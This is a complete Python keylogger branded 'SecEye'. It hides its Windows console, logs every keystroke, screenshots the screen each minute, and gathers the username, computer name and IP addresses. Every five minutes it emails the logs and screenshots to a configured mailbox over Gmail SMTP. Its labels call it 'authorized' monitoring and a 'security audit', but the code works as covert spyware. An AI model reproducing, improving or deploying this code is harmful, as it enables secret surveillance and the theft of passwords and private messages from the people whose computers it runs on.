import threading
import time
import os
import sys
import re
import warnings
from datetime import datetime
from pynput import keyboard
import yagmail
import pygetwindow as gw
import psutil
import requests
from PIL import ImageGrab
import platform
import socket

# Ignore warnings
warnings.filterwarnings('ignore')

# ========== CONFIGURATION ==========
try:
    import config
    EMAIL_ADDRESS = config.EMAIL_ADDRESS
    EMAIL_PASSWORD = config.EMAIL_PASSWORD
    RECEIVER_EMAIL = config.RECEIVER_EMAIL
    SCREENSHOT_INTERVAL = getattr(config, 'SCREENSHOT_INTERVAL', 60)
    EMAIL_INTERVAL = getattr(config, 'EMAIL_INTERVAL', 300)
    BUFFER_SIZE = getattr(config, 'BUFFER_SIZE', 100)
except ImportError:
    EMAIL_ADDRESS = "your_email@gmail.com"
    EMAIL_PASSWORD = "your_app_password"
    RECEIVER_EMAIL = "receiver_email@domain.com"
    SCREENSHOT_INTERVAL = 60
    EMAIL_INTERVAL = 300
    BUFFER_SIZE = 100

# ========== GLOBAL VARIABLES ==========
log_buffer = ""
key_count = 0
screenshots_queue = []
last_email_time = time.time()
last_screenshot_time = time.time()

# ========== HIDE CONSOLE ==========
def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.FreeConsole()

# ========== GET IP ADDRESS ==========
def get_ip_addresses():
    ips = {'public': 'Unknown', 'local': 'Unknown'}
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            ips['public'] = response.text
    except:
        pass
    try:
        hostname = socket.gethostname()
        ips['local'] = socket.gethostbyname(hostname)
    except:
        pass
    return ips

# ========== GET SYSTEM INFO ==========
def get_system_info():
    info = {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'username': os.environ.get('USERNAME', 'Unknown'),
        'os': platform.system() + " " + platform.release(),
        'architecture': platform.machine(),
        'cpu_percent': psutil.cpu_percent(interval=1),
        'ram_percent': psutil.virtual_memory().percent,
        'disk_usage': psutil.disk_usage('/').percent,
        'hostname': socket.gethostname()
    }
    return info

# ========== TAKE SCREENSHOT ==========
def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(os.getcwd(), f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path, "PNG")
        return screenshot_path
    except Exception as e:
        return None

# ========== FILE OPERATIONS ==========
def write_to_file(content):
    try:
        with open("key_logs.txt", "a", encoding="utf-8") as f:
            f.write(content)
            f.flush()
    except:
        pass

def add_to_log(char):
    global log_buffer, key_count
    log_buffer += char
    key_count += 1
    if key_count >= BUFFER_SIZE:
        flush_buffer()

def flush_buffer():
    global log_buffer, key_count
    if log_buffer:
        write_to_file(log_buffer)
        log_buffer = ""
        key_count = 0

def read_all_logs():
    try:
        if os.path.exists("key_logs.txt"):
            with open("key_logs.txt", "r", encoding="utf-8") as f:
                return f.read()
    except:
        pass
    return ""

# ========== CLEAN LOG TEXT ==========
def clean_log_text(raw_log):
    """Clean raw log for better readability"""
    # Remove screenshot markers
    cleaned = re.sub(r'\[SCREENSHOT TAKEN at .*?\]', '', raw_log)
    
    # Remove email sent markers
    cleaned = re.sub(r'\[EMAIL SENT at .*?\]', '', cleaned)
    
    # Remove session start markers
    cleaned = re.sub(r'=+\s*KEYLOGGER SESSION STARTED.*?=+', '', cleaned, flags=re.DOTALL)
    
    # Convert special key codes to readable text
    replacements = {
        r'\[⌫\]': '',
        r'\[⌦\]': '',
        r'\[§\]': ' ',
        r'\[\^\]': ' ',
        r'\[↑\]': ' ',
        r'\[↓\]': ' ',
        r'\[←\]': ' ',
        r'\[→\]': ' ',
        r'\[ESC\]': '',
        r'\[F1\]': '',
        r'\[F2\]': '',
        r'\[F3\]': '',
        r'\[F4\]': '',
        r'\[F5\]': '',
        r'\[F6\]': '',
        r'\[F7\]': '',
        r'\[F8\]': '',
        r'\[F9\]': '',
        r'\[F10\]': '',
        r'\[F11\]': '',
        r'\[F12\]': '',
        r'\[BACKSPACE\]': '',
        r'\[DELETE\]': '',
        r'\[SHIFT\]': '',
        r'\[SHIFT_R\]': '',
        r'\[CTRL\]': '',
        r'\[CTRL_R\]': '',
        r'\[ALT\]': ' ',
        r'\[ALT_R\]': ' ',
        r'\[WIN\]': '',
        r'\[TAB\]': '    ',
        r'\[ENTER\]': '\n',
        r'={70,}': '',
    }
    
    for pattern, replacement in replacements.items():
        cleaned = re.sub(pattern, replacement, cleaned)
    
    # Clean up
    cleaned = re.sub(r' +', ' ', cleaned)
    cleaned = re.sub(r'\n{3,}', '\n\n', cleaned)
    cleaned = re.sub(r' \n', '\n', cleaned)
    cleaned = re.sub(r'\n ', '\n', cleaned)
    
    # Remove empty lines
    lines = cleaned.split('\n')
    cleaned = '\n'.join([line.strip() for line in lines if line.strip()])
    
    if not cleaned:
        cleaned = "[No keystrokes captured in this period]"
    
    return cleaned

# ========== KEY HANDLER ==========
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            add_to_log(key.char)
        elif key == keyboard.Key.space:
            add_to_log(' ')
        elif key == keyboard.Key.enter:
            add_to_log('\n')
            flush_buffer()
        elif key == keyboard.Key.tab:
            add_to_log('    ')
        elif key == keyboard.Key.backspace:
            add_to_log('[⌫]')
        elif key == keyboard.Key.delete:
            add_to_log('[⌦]')
        elif key == keyboard.Key.up:
            add_to_log('')
        elif key == keyboard.Key.down:
            add_to_log('')
        elif key == keyboard.Key.left:
            add_to_log('')
        elif key == keyboard.Key.right:
            add_to_log('')
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            add_to_log('')
        elif key in [keyboard.Key.alt_l, keyboard.Key.alt_r]:
            add_to_log('')
    except:
        pass

def on_release(key):
    pass

# ========== HTML EMAIL GENERATION ==========
def generate_html_report(log_content, ip_info, sys_info, screenshot_count):
    """Generate beautiful, clean HTML email report"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Clean the log content
    clean_log = clean_log_text(log_content)
    
    # Take last 100 lines for readability
    log_lines = clean_log.split('\n')
    if len(log_lines) > 100:
        log_lines = log_lines[-100:]
    clean_log = '\n'.join(log_lines)
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SecEye Security Report</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f0f2f5;
            padding: 40px 20px;
        }}
        .container {{
            max-width: 850px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
        }}
        .header {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 32px 40px;
            text-align: center;
            border-bottom: 3px solid #e94560;
        }}
        .header h1 {{
            color: white;
            font-size: 26px;
            font-weight: 600;
        }}
        .header p {{
            color: #a8b2d1;
            margin-top: 8px;
            font-size: 14px;
        }}
        .badge {{
            display: inline-block;
            background: #e94560;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            margin-top: 12px;
        }}
        .info-section {{
            padding: 24px 32px;
            border-bottom: 1px solid #eef2f6;
        }}
        .section-title {{
            font-size: 16px;
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 16px;
            padding-bottom: 8px;
            border-bottom: 2px solid #e94560;
            display: inline-block;
        }}
        .info-grid {{
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-top: 16px;
        }}
        .info-card {{
            background: #f8f9fc;
            padding: 14px 18px;
            border-radius: 12px;
            border-left: 3px solid #e94560;
        }}
        .info-card .label {{
            font-size: 11px;
            text-transform: uppercase;
            color: #6c757d;
            margin-bottom: 4px;
        }}
        .info-card .value {{
            font-size: 15px;
            font-weight: 500;
            color: #1a1a2e;
        }}
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 12px;
            margin-top: 16px;
        }}
        .stat-card {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            padding: 16px;
            border-radius: 12px;
            text-align: center;
        }}
        .stat-number {{
            font-size: 28px;
            font-weight: 700;
        }}
        .stat-label {{
            font-size: 11px;
            opacity: 0.8;
            margin-top: 4px;
        }}
        .keystrokes {{
            background: #1e1e2e;
            color: #cbd5e1;
            padding: 20px;
            border-radius: 12px;
            font-family: 'SF Mono', 'Fira Code', monospace;
            font-size: 12px;
            line-height: 1.6;
            overflow-x: auto;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 8px;
        }}
        .footer {{
            background: #f8f9fc;
            padding: 20px 32px;
            text-align: center;
            color: #6c757d;
            font-size: 11px;
        }}
        @media (max-width: 600px) {{
            .stats-grid {{
                grid-template-columns: repeat(2, 1fr);
            }}
            .info-grid {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>👁️ SecEye Security Report</h1>
            <p>Endpoint Monitoring & Audit Log</p>
            <div class="badge">Authorized Security Assessment</div>
        </div>
        
        <div class="info-section">
            <div class="section-title">🌐 Network & System</div>
            <div class="info-grid">
                <div class="info-card">
                    <div class="label">Public IP</div>
                    <div class="value">{ip_info.get('public', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <div class="label">Local IP</div>
                    <div class="value">{ip_info.get('local', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <div class="label">Computer Name</div>
                    <div class="value">{sys_info.get('computer', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <div class="label">Username</div>
                    <div class="value">{sys_info.get('username', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <div class="label">Operating System</div>
                    <div class="value">{sys_info.get('os', 'Unknown')}</div>
                </div>
                <div class="info-card">
                    <div class="label">Architecture</div>
                    <div class="value">{sys_info.get('architecture', 'Unknown')}</div>
                </div>
            </div>
        </div>
        
        <div class="info-section">
            <div class="section-title">📊 System Health</div>
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">{sys_info.get('cpu_percent', 0)}%</div>
                    <div class="stat-label">CPU Usage</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{sys_info.get('ram_percent', 0)}%</div>
                    <div class="stat-label">RAM Usage</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{sys_info.get('disk_usage', 0)}%</div>
                    <div class="stat-label">Disk Usage</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{screenshot_count}</div>
                    <div class="stat-label">Screenshots</div>
                </div>
            </div>
        </div>
        
        <div class="info-section">
            <div class="section-title">📝 Keystroke Activity</div>
            <div class="keystrokes">{clean_log}</div>
        </div>
        
        <div class="footer">
            <p>Report generated: {timestamp}</p>
            <p>Monitoring: Every 5 minutes | Screenshots: Every 1 minute</p>
            <p>🔐 This is an automated security audit report</p>
        </div>
    </div>
</body>
</html>
    """
    return html

# ========== SEND EMAIL ==========
def send_batch_email():
    """Send email with all collected screenshots and logs"""
    global screenshots_queue, last_email_time
    
    if not screenshots_queue:
        return False
    
    try:
        log_content = read_all_logs()
        ip_info = get_ip_addresses()
        sys_info = get_system_info()
        
        # Clean the log for plain text version
        clean_log_preview = clean_log_text(log_content)
        if len(clean_log_preview) > 500:
            clean_log_preview = clean_log_preview[-500:] + "\n\n[...]"
        
        # Plain text version
        plain_text = f"""
╔══════════════════════════════════════════════════════════════╗
║                    👁️ SECEYE SECURITY REPORT                  ║
║                   Authorized Monitoring Only                  ║
╚══════════════════════════════════════════════════════════════╝

Time        : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Computer    : {sys_info['computer']}
User        : {sys_info['username']}
Public IP   : {ip_info['public']}
Local IP    : {ip_info['local']}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 SYSTEM STATUS
─────────────────────────────────────────────────────────────────
CPU Usage   : {sys_info['cpu_percent']}%
RAM Usage   : {sys_info['ram_percent']}%
Disk Usage  : {sys_info['disk_usage']}%

📸 Screenshots Attached : {len(screenshots_queue)}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📝 KEYSTROKE ACTIVITY
─────────────────────────────────────────────────────────────────

{clean_log_preview}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Total characters captured: {len(log_content)}

Report generated by SecEye Monitoring Tool
This is an automated security audit message.
"""
        
        # Generate HTML
        html_content = generate_html_report(log_content, ip_info, sys_info, len(screenshots_queue))
        
        # Send email
        yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
        
        subject = f"👁️ SecEye Report - {sys_info['computer']} - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        
        yag.send(
            to=RECEIVER_EMAIL,
            subject=subject,
            contents=[plain_text, html_content] + screenshots_queue.copy()
        )
        
        yag.close()
        
        # Cleanup screenshots
        for screenshot in screenshots_queue:
            try:
                if os.path.exists(screenshot):
                    os.remove(screenshot)
            except:
                pass
        
        screenshots_queue = []
        last_email_time = time.time()
        
        write_to_file(f"\n[REPORT SENT: {datetime.now()}]\n")
        
        return True
        
    except Exception as e:
        write_to_file(f"\n[EMAIL ERROR: {str(e)}]\n")
        return False

# ========== SCREENSHOT COLLECTOR ==========
def collect_screenshots():
    global last_screenshot_time, screenshots_queue
    
    while True:
        time.sleep(1)
        
        current_time = time.time()
        if (current_time - last_screenshot_time) >= SCREENSHOT_INTERVAL:
            screenshot_path = take_screenshot()
            
            if screenshot_path and os.path.exists(screenshot_path):
                screenshots_queue.append(screenshot_path)
                write_to_file(f"\n[SCREENSHOT TAKEN at {datetime.now().strftime('%H:%M:%S')}]\n")
            
            last_screenshot_time = current_time

# ========== EMAIL SCHEDULER ==========
def email_scheduler():
    global last_email_time
    
    while True:
        time.sleep(10)
        
        current_time = time.time()
        if (current_time - last_email_time) >= EMAIL_INTERVAL:
            if screenshots_queue:
                send_batch_email()

# ========== PERIODIC FLUSH ==========
def periodic_flush():
    while True:
        time.sleep(5)
        flush_buffer()

# ========== TIMESTAMP ==========
def write_timestamp():
    ip_info = get_ip_addresses()
    sys_info = get_system_info()
    
    header = f"""
{'='*70}
👁️ SECEYE MONITORING SESSION STARTED
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Computer: {sys_info['computer']}
User: {sys_info['username']}
Public IP: {ip_info['public']}
Local IP: {ip_info['local']}
Screenshot Interval: {SCREENSHOT_INTERVAL} seconds
Email Interval: {EMAIL_INTERVAL} seconds
{'='*70}

"""
    write_to_file(header)

# ========== MAIN ==========
def run_keylogger():
    write_timestamp()
    
    # Start keyboard listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Start threads
    threading.Thread(target=periodic_flush, daemon=True).start()
    threading.Thread(target=collect_screenshots, daemon=True).start()
    threading.Thread(target=email_scheduler, daemon=True).start()
    
    print("✅ SecEye is running!")
    print(f"   📸 Screenshot every {SCREENSHOT_INTERVAL} seconds")
    print(f"   📧 Email every {EMAIL_INTERVAL} seconds")
    print(f"   📁 Log file: key_logs.txt")
    print("\nPress Ctrl+C to stop...\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        flush_buffer()
        if screenshots_queue:
            send_batch_email()
        sys.exit(0)

if __name__ == "__main__":
    hide_console()
    run_keylogger()